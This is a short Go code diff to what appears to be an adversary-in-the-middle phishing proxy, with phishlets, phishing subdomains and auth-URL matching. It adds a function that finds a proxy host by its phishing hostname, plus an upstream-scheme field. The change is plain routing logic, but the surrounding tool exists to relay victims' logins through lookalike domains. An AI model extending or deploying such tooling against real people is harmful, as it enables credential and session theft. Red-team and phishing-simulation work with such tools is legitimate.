@@ -2,6 +2,7 @@ package aitm
 
 import (
 	"fmt"
+	"net"
 	"regexp"
 	"strings"
 )
@@ -85,6 +86,22 @@ func (p *Phishlet) FindLanding() *ProxyHost {
 	return nil
 }
 
+// FindProxyHost returns the proxy host whose phishing FQDN matches phishHost,
+// stripping any port and normalising case. Returns nil if no host matches.
+func (p *Phishlet) FindProxyHost(phishHost string) *ProxyHost {
+	host := phishHost
+	if h, _, err := net.SplitHostPort(phishHost); err == nil {
+		host = h
+	}
+	lowerHost := strings.ToLower(host)
+	for i := range p.ProxyHosts {
+		if strings.ToLower(p.ProxyHosts[i].PhishSubdomain+"."+p.BaseDomain) == lowerHost {
+			return &p.ProxyHosts[i]
+		}
+	}
+	return nil
+}
+
 // MatchesAuthURL reports whether rawURL matches any of the phishlet's auth URL patterns.
 func (p *Phishlet) MatchesAuthURL(rawURL string) bool {
 	for _, authURL := range p.AuthURLs {
@@ -103,6 +120,7 @@ type ProxyHost struct {
 	IsLanding      bool
 	IsSession      bool
 	AutoFilter     bool
+	UpstreamScheme string // "http" or "https"
 }
 
 // OriginHost returns the fully qualified upstream hostname
